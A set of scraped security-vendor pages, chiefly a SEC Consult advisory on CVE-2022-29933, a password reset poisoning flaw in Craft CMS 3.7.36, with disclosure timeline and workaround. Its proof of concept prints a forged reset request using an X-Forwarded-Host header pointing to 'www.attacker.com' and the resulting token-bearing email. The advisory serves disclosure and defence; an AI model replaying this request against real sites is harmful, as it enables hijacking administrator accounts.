=== Content from sec-consult.com_598f58ae_20250115_102154.html ===

Toggle Navbar

* [Career](/career/)
* [About us](/about-us/)
* [Contact](/contact/)

* EN
  + [DE](/de/vulnerability-lab/ "German")
Search

* Compliance & Regulations
  + [NIS2](/compliance-regulations/nis2/)
  + [Digital Operational Resilience Act (DORA)](/compliance-regulations/dora/)
* Security Testing
  + [Web Application Security](/security-testing/web-application-security/)
  + [Penetration Testing](/security-testing/penetration-testing/)
  + [Mobile Security](/security-testing/mobile-security/)
  + [Cloud Security](/security-testing/cloud-security/)
  + [IT Infrastructure Security](/security-testing/it-infrastructure-security/)
  + [Security for SAP Services](/security-testing/security-for-sap-services/)
  + [IoT and Embedded Systems Security](/security-testing/iot-and-embedded-systems-security/)
  + [Red Teaming](/security-testing/red-teaming/)
* Processes & Organisation
  + [Information Security Management (ISM)](/processes-organisation/information-security-management-ism/)
  + [OT Security](/processes-organisation/ot-security/)
  + [Secure Software Development Consulting](/processes-organisation/secure-software-development/)
  + [Red Teaming](/security-testing/red-teaming/)
  + [SEC Trainings](/processes-organisation/sec-trainings/)
  + [Project- und Program Management](/processes-organisation/project-und-program-management/)
* Incident Response
  + [SEC Defence](/incident-response/sec-defence/)
* [Vulnerability Lab](/vulnerability-lab/)
* [Blog](/blog/)
 [Incident?
Breached?
Report an incident](/incident-response/sec-defence/)

1. [Home](/)
2. Vulnerability Lab
# Vulnerability Lab

With the **Vulnerability Lab**, SEC Consult **operates its own internal security laboratory**, in order to ensure an international know-how advantage over attackers in the areas of network and application security. In addition, this facility serves the support with high-quality penetration tests and with the evaluation of new technologies and is at the service of our customers. Thus, they receive the latest information about security gaps and valid statements about the risk profile of new technologies.

Our Vulnerability Lab follows a [Responsible Disclosure Policy](/vulnerability-lab/responsible-disclosure-policy/) which aims to provide vendors with the necessary information and timeframe needed to validate and fix a security flaw in order to mutually coordinate the public release of a security advisory as part of our responsible disclosure process. This document also clarifies the extent and limitation of effort the SEC Consult Vulnerability Lab will invest. It can be found [here](/vulnerability-lab/responsible-disclosure-policy/).

Here you find all our **[studies and whitepapers](/vulnerability-lab/studies-and-whitepapers/)**.

You can reach our Vulnerability Lab through security-research(at)sec-consult.com. The PGP key with fingerprint F9A9D4AF3DC2D298835090252D2DD7B5C6EE883F can be downloaded [here](https://keys.openpgp.org/vks/v1/by-fingerprint/F9A9D4AF3DC2D298835090252D2DD7B5C6EE883F).

The SEC Consult Vulnerability Lab is also an official [CNA](https://www.cve.org/PartnerInformation/ListofPartners/partner/SEC-VLab) (CVE Numbering Authority) and our scope for assigning CVE numbers is all vulnerabilities discovered in third-party hardware/software by the SEC Consult Vulnerability Lab, which are not in another CNA's scope.

* [All](/vulnerability-lab/)
* [2024](/vulnerability-lab/2024/)
* [2023](/vulnerability-lab/2023/)
* [2022](/vulnerability-lab/2022/)
* [2021](/vulnerability-lab/2021/)
* [2020](/vulnerability-lab/2020/)
* [2019](/vulnerability-lab/2019/)
* [2018](/vulnerability-lab/2018/)
* [2017](/vulnerability-lab/2017/)
* [2016](/vulnerability-lab/2016/)
* [2015](/vulnerability-lab/2015/)
* [2014](/vulnerability-lab/2014/)
* [2013](/vulnerability-lab/2013/)
* [2012](/vulnerability-lab/2012/)
* [2011](/vulnerability-lab/2011/)
* [2010](/vulnerability-lab/2010/)
* [2009](/vulnerability-lab/2009/)
* [2008](/vulnerability-lab/2008/)
* [2007](/vulnerability-lab/2007/)
* [2006](/vulnerability-lab/2006/)
* [2005](/vulnerability-lab/2005/)
* [2004](/vulnerability-lab/2004/)
* [2003](/vulnerability-lab/2003/)
### [Reflected Cross-Site Scripting in Numerix License Server Administration System Login](/vulnerability-lab/advisory/reflected-cross-site-scripting-in-numerix-license-server-administration-system-login/ "Reflected Cross-Site Scripting in Numerix License Server Administration System Login")

11. Dec 2024
### [Multiple Critical Vulnerabilities in Image Access Scan2Net](/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-image-access-scan2net/ "Multiple Critical Vulnerabilities in Image Access Scan2Net")

04. Dec 2024
### [Stored Cross-Site Scripting in Omada Identity](/vulnerability-lab/advisory/stored-cross-site-scripting-in-omada-identity/ "Stored Cross-Site Scripting in Omada Identity")

27. Nov 2024
### [Unlocked JTAG interface and buffer overflow in Siemens SM-2558 Protocol Element (extension module for Siemens SICAM AK3/TM/BC), Siemens CP-2016 & CP-2019](/vulnerability-lab/advisory/unlocked-jtag-interface-and-buffer-overflow-in-siemens-sm-2558-protocol-element/ "Unlocked JTAG interface and buffer overflow in Siemens SM-2558 Protocol Element (extension module for Siemens SICAM AK3/TM/BC), Siemens CP-2016 & CP-2019")

25. Nov 2024
### [Multiple vulnerabilities in Siemens Energy Omnivise T3000](/vulnerability-lab/advisory/multiple-vulnerabilities-in-siemens-energy-omnivise-t3000/ "Multiple vulnerabilities in Siemens Energy Omnivise T3000")

12. Nov 2024
### [Multiple Vulnerabilities in HASOMED Elefant and Elefant Software Updater](/vulnerability-lab/advisory/multiple-vulnerabilities-in-hasomed-elefant-and-elefant-software-updater/ "Multiple Vulnerabilities in HASOMED Elefant and Elefant Software Updater")

07. Nov 2024
### [Query Filter Injection in Ping Identity PingIDM (formerly known as ForgeRock Identity Management)](/vulnerability-lab/advisory/query-filter-injection-in-ping-identity-pingidm-formerly-known-as-forgerock-identity-management/ "Query Filter Injection in Ping Identity PingIDM (formerly known as ForgeRock Identity Management)")

30. Oct 2024
### [Unauthenticated Path Traversal Vulnerability in Lawo AG vsm LTC Time Sync (vTimeSync)](/vulnerability-lab/advisory/unauthenticated-path-traversal-vulnerability-in-lawo-ag-vsm-ltc-time-sync-vtimesync/ "Unauthenticated Path Traversal Vulnerability in Lawo AG vsm LTC Time Sync (vTimeSync)")

24. Oct 2024
### [Authenticated Remote Code Execution in multiple Xerox printers](/vulnerability-lab/advisory/authenticated-remote-code-execution-in-multiple-xerox-printers/ "Authenticated Remote Code Execution in multiple Xerox printers")

23. Oct 2024
### [Multiple Vulnerabilities in Rittal IoT Interface & CMC III Processing Unit](/vulnerability-lab/advisory/multiple-vulnerabilities-in-rittal-iot-interface-cmc-iii-processing-unit/ "Multiple Vulnerabilities in Rittal IoT Interface & CMC III Processing Unit")

15. Oct 2024
### [Local Privilege Escalation via MSI installer in Palo Alto Networks GlobalProtect](/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-palo-alto-networks-globalprotect/ "Local Privilege Escalation via MSI installer in Palo Alto Networks GlobalProtect")

09. Oct 2024
### [Local Privilege Escalation via MSI Installer in Nitro PDF Pro](/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-nitro-pdf-pro/ "Local Privilege Escalation via MSI Installer in Nitro PDF Pro")

30. Sep 2024
### [Uninstall Password Bypass in BlackBerry CylanceOPTICS Windows Installer Package](/vulnerability-lab/advisory/uninstall-password-bypass-in-blackberry-cylanceoptics-windows-installer-package/ "Uninstall Password Bypass in BlackBerry CylanceOPTICS Windows Installer Package")

25. Sep 2024
### [Local Privilege Escalation via MSI installer in SoftMaker Office / FreeOffice](/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-softmaker-office-freeoffice/ "Local Privilege Escalation via MSI installer in SoftMaker Office / FreeOffice")

27. Jun 2024
### [Multiple Vulnerabilities in Siemens Power Automation Products (CP-8000/CP-8021/CP8-022/CP-8031/CP-8050/SICORE)](/vulnerability-lab/advisory/multiple-vulnerabilities-in-siemens-power-automation-products-cp-8000-cp-8021-cp8-022-cp-8031-cp-8050-sicore/ "Multiple Vulnerabilities in Siemens Power Automation Products (CP-8000/CP-8021/CP8-022/CP-8031/CP-8050/SICORE)")

26. Jun 2024

* Page 1 of 29
* 1
* [2](/vulnerability-lab/page/2/)
* [3](/vulnerability-lab/page/3/)
* …
* [29](/vulnerability-lab/page/29/)
* [next](/vulnerability-lab/page/2/)

* [Legal Notice](/legalnotice/)
* [Privacy Statement](/privacy-statement/)
* [Jobs](/career/)

SEC Consult is one of the leading consultancies in the field of cyber and [application security](/security-testing/web-application-security/ "Web Application Security"). The company specializes in [information security management](/processes-organisation/information-security-management-ism/ "Information Security Management (ISM)"), NIS security audits, [penetration testing](/security-testing/penetration-testing/ "Pentesting (Pentest)"), ISO 27001 certification support, [Cyber Defence](/incident-response/sec-defence/ "Cyber Defence") and [secure software certification](/processes-organisation/secure-software-development/ "Secure Software Development Consulting"). SEC Consult is part of [Eviden](https://eviden.com/ "Link to Eviden website").

[![bsi ISO/IEC 27001 Information Security Management CERTIFIED](/typo3temp/assets/_processed_/c/2/csm_bsi_9a24e74563.png)](/about-us/ "About us")[![ISO 27001 CREST certified](/typo3temp/assets/_processed_/0/6/csm_crest_0eb9c5864d.png)](/about-us/ "About us")[![Great Place To Work AT certified](/typo3temp/assets/_processed_/0/3/csm_great-place-to-work-at_773b265aa6.png)](/about-us/ "About us")[![Great Place To Work DE certified](/typo3temp/assets/_processed_/d/6/csm_great-place-to-work-de_2fcb537270.png)](/about-us/ "About us")

## We use Cookies

We use cookies to offer you a perfect visit experience. These include cookies that are necessary for the operation of the site and for the control of our commercial corporate goals, as well as those that are only used for anonymous statistical purposes, for convenience settings or to display personalized content. Decide for yourself which categories you want to allow. Please note that based on your settings, not all functions of the site may be available.

**[Legal Notice](/legalnotice/)** •  **[Privacy Statement](/privacy-statement/)**

### Technically required

(
0
Service
)

no

Technically required (
0
Service
)

yes

### Analysis / statistics

(
1
Service
)

Anonymous evaluation for troubleshooting and further development

no

Analysis / statistics (
1
Service
)

yes

#### Matomo

no

Matomo

yes

Matomo.org
Show details

Hide details

**Purpose**: Error analysis, statistical evaluation of our website accesses, campaign analysis, conversion tracking.
 **Processing operations**: collection of access data, data from your browser and data about the content accessed; execution of analysis software and storage of data on your terminal device, anonymization of the data collected; evaluation of the anonymous data in the form of statistics.
 **Storage period**: 1 year.
 **Joint controller**: LimeSoda Interactive Marketing GmbH.
 **Legal basis for data processing**: Art. 6 para. 1 lit. f of the DSGVO.
 **Consequences of non-consent**: This basic tracking is absolutely necessary for the operation of our website.
 **Data transfer**: The data collected with Matomo is stored on our own servers. It is not passed on to third parties.

Accept selected

Reject all

Accept all



=== Content from packetstormsecurity.com_4dab66c6_20250115_102152.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from github.com_2adde8f3_20250115_102153.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcraftcms%2Fcms%2Fblob%2F5.x%2FCHANGELOG.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcraftcms%2Fcms%2Fblob%2F5.x%2FCHANGELOG.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=craftcms%2Fcms)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[craftcms](/craftcms)
/
**[cms](/craftcms/cms)**
Public

* [Notifications](/login?return_to=%2Fcraftcms%2Fcms) You must be signed in to change notification settings
* [Fork
  638](/login?return_to=%2Fcraftcms%2Fcms)
* [Star
   3.3k](/login?return_to=%2Fcraftcms%2Fcms)

* [Code](/craftcms/cms)
* [Issues
  414](/craftcms/cms/issues)
* [Pull requests
  36](/craftcms/cms/pulls)
* [Discussions](/craftcms/cms/discussions)
* [Actions](/craftcms/cms/actions)
* [Security](/craftcms/cms/security)
* [Insights](/craftcms/cms/pulse)

Additional navigation options

* [Code](/craftcms/cms)
* [Issues](/craftcms/cms/issues)
* [Pull requests](/craftcms/cms/pulls)
* [Discussions](/craftcms/cms/discussions)
* [Actions](/craftcms/cms/actions)
* [Security](/craftcms/cms/security)
* [Insights](/craftcms/cms/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from sec-consult.com_7f077074_20250115_102154.html ===

Toggle Navbar

* [Career](/career/)
* [About us](/about-us/)
* [Contact](/contact/)

* EN
  + [DE](/de/vulnerability-lab/advisory/password-reset-poisoning-angriff-craft-cms/ "German")
Search

* Compliance & Regulations
  + [NIS2](/compliance-regulations/nis2/)
  + [Digital Operational Resilience Act (DORA)](/compliance-regulations/dora/)
* Security Testing
  + [Web Application Security](/security-testing/web-application-security/)
  + [Penetration Testing](/security-testing/penetration-testing/)
  + [Mobile Security](/security-testing/mobile-security/)
  + [Cloud Security](/security-testing/cloud-security/)
  + [IT Infrastructure Security](/security-testing/it-infrastructure-security/)
  + [Security for SAP Services](/security-testing/security-for-sap-services/)
  + [IoT and Embedded Systems Security](/security-testing/iot-and-embedded-systems-security/)
  + [Red Teaming](/security-testing/red-teaming/)
* Processes & Organisation
  + [Information Security Management (ISM)](/processes-organisation/information-security-management-ism/)
  + [OT Security](/processes-organisation/ot-security/)
  + [Secure Software Development Consulting](/processes-organisation/secure-software-development/)
  + [Red Teaming](/security-testing/red-teaming/)
  + [SEC Trainings](/processes-organisation/sec-trainings/)
  + [Project- und Program Management](/processes-organisation/project-und-program-management/)
* Incident Response
  + [SEC Defence](/incident-response/sec-defence/)
* [Vulnerability Lab](/vulnerability-lab/)
* [Blog](/blog/)
 [Incident?
Breached?
Report an incident](/incident-response/sec-defence/)

1. [Home](/)
2. [Vulnerability Lab](/vulnerability-lab/)
3. Password Reset Poisoning Attack in Craft CMS
# Password Reset Poisoning Attack in Craft CMS

Title

Password Reset Poisoning Attack

Product

Craft CMS

Vulnerable Version

3.7.36 and potentially lower

Fixed Version

none, see workaround by vendor

CVE Number

CVE-2022-29933

Impact

high

Homepage

[https://craftcms.com](https://craftcms.com "https://craftcms.com")

Found

14.03.2022

By

Sandro Einfeldt (Office Munich) | SEC Consult Vulnerability Lab

Craft CMS provides users with a backend interface to implement the website and configure the CMS. On the login page, users are given the option to reset the account password by providing a valid account name or email address. The password reset function is vulnerable to a password reset poisoning attack.

## Vendor description

*"Craft is a flexible, user-friendly CMS for creating custom digital experiences on the web and beyond. It features:*

* *An intuitive, user-friendly control panel for content creation and administrative tasks.*
* *A clean-slate approach to content modeling and front-end development that doesn’t make any assumptions about your content or how it should be consumed.*
* *A built-in Plugin Store with hundreds of free and commercial plugins, all just a click away.*
* *A robust framework for module and plugin development.*
* *An active, vibrant community.**"*

Source: [craftcms.com/docs/3.x/](https://craftcms.com/docs/3.x/)

## Business recommendation

The vendor responded that the vulnerability will not be fixed as a workaround is available.

An in-depth security analysis performed by security professionals is highly advised, as the software may be affected from further security issues.

## Vulnerability overview/description

### 1) Password Reset Poisoning Attack (CVE-2022-29933)

The password reset function of the Craft CMS backend login page, usually accessible under https:// <hostname>/index.php?p=admin/login, is vulnerable to a password reset poisoning attack. An unauthenticated attacker who knows valid email addresses or account names of Craft CMS backend users is able to manipulate the password reset functionality in a way that the registered users of the CMS receive password reset emails containing a malicious password reset link.

The link contains valid (secret) tokens in the URL's GET parameters that are necessary to authenticate against the server's password reset function and enable a user who lost or forgot the account's password to reset the password. By manipulating the password reset request, an attacker is able to set an arbitrary hostname in the resulting password reset link. Thereby, the attacker can set the link to point to an attacker-controlled host. If a user clicks on the reset link, the valid reset tokens in the GET parameters will be sent to the attacker's web server and can be extracted from the server logs. The attacker is able to build a valid password reset link by adding the tokens to the general reset link structure:

```
https:// <hostname>/index.php?p=admin/set-password&code=<token1>&id=<token2>
```

If the attacker calls the filled out URL with a web browser, the attacker will be able to reset the account's password and log in.

## Proof of concept

### 1) Password Reset Poisoning Attack (CVE-2022-29933)

First, the attacker needs to browse the following URL:

```
https:// <hostname>/index.php?p=admin/login
```

The login mask contains a link "Forgot your password?". Following this link, the attacker gets prompted to submit a valid account name or email address. After entering the account name or email address and pressing the "Reset Password" button, the attacker can intercept the resulting HTTP POST request with an intercepting web proxy (e.g. BurpSuite). The intercepted request can then be manipulated before getting forwarded to the server. The attacker needs to add the HTTP header.

```
X-Forwarded-Host: <attacker_host>
```

...while the value should contain the hostname of the webserver under the attacker's control.

Manipulated Request:

```
POST /index.php?p=admin/actions/users/send-password-reset-email HTTP/1.1
Host: <IP>
X-Forwarded-Host: www.attacker.com
[...]
Referer: http:// <IP>/index.php?p=admin/login
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Registered-Asset-Bundles: ,craft\web\assets\login\[...]
X-Registered-Js-Files: ,http://<IP>/cpresources/[...]
X-CSRF-Token: c9kEDPROifmFNKSKhght_JgkBgnnk5EfXiH1qHA[...]
X-Requested-With: XMLHttpRequest
Content-Length: 38
Origin: http:// <IP>
Connection: close
Cookie: CRAFT_CSRF_TOKEN=[...]

loginName=test%40example.com
```

The resulting server response indicates that the request has been processed.

Response:

```
HTTP/1.1 200 OK
Date: Mon, 14 Mar 2022 08:19:24 GMT
[...]
X-Powered-By: Craft CMS
Content-Length: 16
Connection: close
Content-Type: application/json; charset=UTF-8

{"success":true}
```

The user will then receive a malicious password reset email pointing to the hostname that the attacker provided by adding the X-Forwarded-Host header.

Email:

```
Hey Test,

To reset your Test Install password, click on this link:

http:// www.attacker.com/index.php?p=admin/set-password&code=D6HWm7pGpYEt9mb-mPVh4kGzXWZ8ax5u&id=48b9fe48-91c9-430e-baa2-5bdf66c88102

If you were not expecting this email, just ignore it.
```

If the user is not aware and clicks on the link, the values of the reset tokens  "code" and "id" will be sent to the attacker's web server. The attacker is then able to relay the tokens to the original reset endpoint and reset the password.

## Vulnerable / tested versions

The following version has been tested and found to be vulnerable:

* 3.7.36

## Vendor contact timeline

| 2022-03-10 | Contacting vendor through contact form. |
| --- | --- |
| 2022-03-14 | Vendor provides Craft CMS installation for verifying the vulnerability. |
| 2022-03-22 | SEC Consult provides the vulnerability advisory through contact form. |
| 2022-03-23 | Vendor responded that there is a hardening measure available. |
| 2022-03-31 | SEC Consult replied that all installations of the current version (including the testing instance provided by the vendor) are vulnerable by default and the vulnerability is implementation-based and results from bad coding practices. |
| Until 2022-05-02 | No answer from vendor. |
| 2022-05-03 | Set advisory release date to 5th May. Informing vendor about scheduled advisory release. |
| 2022-05-05 | Release of security advisory. |

## Solution

The vendor knows about the vulnerability and the resulting risks. A possible hardening measure has to be implemented manually and is documented here:
[craftcms.com/knowledge-base/securing-craft](https://craftcms.com/knowledge-base/securing-craft#explicitly-set-the-web-alias-for-the-site)
[craftcms.com/docs/3.x/sites.html](https://craftcms.com/docs/3.x/sites.html#site-url)

The vendor responded that the vulnerability will not be fixed as a workaround is available.

## Workaround

The backend login interface and the password reset function should not be  accessible from the internet or from any unknown IP addresses. The user must implement the workaround described in the hardening guide above in order to mitigate this issue.

## Advisory URL

[sec-consult.com/vulnerability-lab/](https://sec-consult.com/vulnerability-lab/)

EOF Sandro Einfeldt / @2022

*Interested in working with the experts of SEC Consult? Send us your [application](https://sec-consult.com/career/).*

*Interested in improving your cyber security with the experts of SEC Consult? Contact our [local offices](https://sec-consult.com/contact).*

[Back](/vulnerability-lab/)

* [Legal Notice](/legalnotice/)
* [Privacy Statement](/privacy-statement/)
* [Jobs](/career/)

SEC Consult is one of the leading consultancies in the field of cyber and [application security](/security-testing/web-application-security/ "Web Application Security"). The company specializes in [information security management](/processes-organisation/information-security-management-ism/ "Information Security Management (ISM)"), NIS security audits, [penetration testing](/security-testing/penetration-testing/ "Pentesting (Pentest)"), ISO 27001 certification support, [Cyber Defence](/incident-response/sec-defence/ "Cyber Defence") and [secure software certification](/processes-organisation/secure-software-development/ "Secure Software Development Consulting"). SEC Consult is part of [Eviden](https://eviden.com/ "Link to Eviden website").

[![bsi ISO/IEC 27001 Information Security Management CERTIFIED](/typo3temp/assets/_processed_/c/2/csm_bsi_9a24e74563.png)](/about-us/ "About us")[![ISO 27001 CREST certified](/typo3temp/assets/_processed_/0/6/csm_crest_0eb9c5864d.png)](/about-us/ "About us")[![Great Place To Work AT certified](/typo3temp/assets/_processed_/0/3/csm_great-place-to-work-at_773b265aa6.png)](/about-us/ "About us")[![Great Place To Work DE certified](/typo3temp/assets/_processed_/d/6/csm_great-place-to-work-de_2fcb537270.png)](/about-us/ "About us")

## We use Cookies

We use cookies to offer you a perfect visit experience. These include cookies that are necessary for the operation of the site and for the control of our commercial corporate goals, as well as those that are only used for anonymous statistical purposes, for convenience settings or to display personalized content. Decide for yourself which categories you want to allow. Please note that based on your settings, not all functions of the site may be available.

**[Legal Notice](/legalnotice/)** •  **[Privacy Statement](/privacy-statement/)**

### Technically required

(
0
Service
)

no

Technically required (
0
Service
)

yes

### Analysis / statistics

(
1
Service
)

Anonymous evaluation for troubleshooting and further development

no

Analysis / statistics (
1
Service
)

yes

#### Matomo

no

Matomo

yes

Matomo.org
Show details

Hide details

**Purpose**: Error analysis, statistical evaluation of our website accesses, campaign analysis, conversion tracking.
 **Processing operations**: collection of access data, data from your browser and data about the content accessed; execution of analysis software and storage of data on your terminal device, anonymization of the data collected; evaluation of the anonymous data in the form of statistics.
 **Storage period**: 1 year.
 **Joint controller**: LimeSoda Interactive Marketing GmbH.
 **Legal basis for data processing**: Art. 6 para. 1 lit. f of the DSGVO.
 **Consequences of non-consent**: This basic tracking is absolutely necessary for the operation of our website.
 **Data transfer**: The data collected with Matomo is stored on our own servers. It is not passed on to third parties.

Accept selected

Reject all

Accept all


